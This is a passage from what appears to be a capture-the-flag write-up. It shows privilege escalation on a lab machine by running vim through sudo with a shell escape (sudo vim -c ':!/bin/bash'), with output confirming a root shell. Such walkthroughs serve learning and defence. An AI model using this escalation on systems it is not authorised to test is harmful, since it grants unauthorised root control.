Privilege Escalation

With our current user, we can run vim as root, this is great, if we go to GTFPBins we can see that there is a way to escalate our privileges to root using this command: sudo vim -c ':!/bin/bash' , so let’s do it:

1
2
3
4
5
6

$ sudo vim -c ':!/bin/bash'

root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Machine:~# ls /root
root.txt

And just like that, we got root on the machine.
